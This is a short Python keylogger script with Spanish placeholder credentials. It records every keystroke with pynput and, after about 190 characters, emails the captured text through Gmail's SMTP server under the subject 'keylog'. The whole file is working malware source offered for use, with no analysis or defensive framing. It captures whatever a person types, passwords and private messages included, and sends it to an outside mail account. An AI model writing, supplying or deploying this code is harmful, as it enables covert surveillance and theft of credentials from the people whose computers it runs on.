from pynput.keyboard import Key, Listener
from email.message import EmailMessage
import smtplib, ssl

keys = ''

def on_press(key):
    print(key)
    global keys, count
    keys += str(key)
    print(len(keys),  keys)
    if len(keys) > 190:
        send_email(keys)
        keys = ''

def send_email(message):
    smtp_server = "smtp.gmail.com"
    port = 587
    sender_email = "tucorreo@gmail.com"
    password = "codigo de 16 digitos"
    receiver_email = sender_email


    em = EmailMessage()
    em.set_content(message)
    em['To'] = receiver_email
    em['From'] = sender_email
    em['Subject'] = 'keylog'

    context = ssl.create_default_context()

    with smtplib.SMTP(smtp_server, port) as s:
        s.ehlo()
        s.starttls(context=context)
        s.ehlo()
        s.login(sender_email, password)
        s.send_message(em)

with Listener(on_press=on_press) as listener:
    listener.join()
